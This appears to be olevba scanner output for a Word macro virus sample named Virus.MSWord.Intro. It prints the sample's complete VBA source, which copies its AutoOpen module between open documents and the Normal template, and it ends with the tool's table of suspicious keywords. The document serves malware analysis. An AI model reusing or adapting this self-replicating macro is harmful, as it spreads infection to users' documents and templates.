olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Intro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Intro - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Intro - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Main()
'Hello
  If Not ActiveDocHaveCopied Then
    CopyToActiveDoc
  ElseIf Not NormHaveCopied Then
    CopyToNormal
    Else: MsgBox ("How are you! Please tell me your name!")
  End If
End Sub
Sub CopyToNormal()
  For Each aModule In NormalTemplate.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      IsDblName = True
      Exit For
    End If
  Next aModule
  If IsDblName Then
    With NormalTemplate.VBProject.VBComponents
      .Remove .Item("AutoOpen")
    End With
  End If
  Application.OrganizerCopy Source:=ActiveDocument.FullName, _
       Destination:=NormalTemplate.FullName, _
       Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
  NormalTemplate.Save
End Sub
Sub CopyToActiveDoc()
  For Each aModule In ActiveDocument.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      IsDblName = True
      Exit For
    End If
  Next aModule
  If IsDblName Then
    With ActiveDocument.VBProject.VBComponents
      .Remove .Item("AutoOpen")
    End With
  End If
  Application.OrganizerCopy Source:=NormalTemplate.FullName, _
       Destination:=ActiveDocument.FullName, _
       Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
  ActiveDocument.Save
End Sub
Function NormHaveCopied() As Boolean
  For Each aModule In NormalTemplate.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      If aModule.CodeModule.Lines(2, 1) = "'Hello" Then NormHaveCopied = True
    End If
  Next aModule
End Function
Function ActiveDocHaveCopied() As Boolean
  For Each aModule In ActiveDocument.VBProject.VBComponents
    If aModule.Name = "AutoOpen" Then
      If aModule.CodeModule.Lines(2, 1) = "'Hello" Then ActiveDocHaveCopied = True
    End If
  Next aModule
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

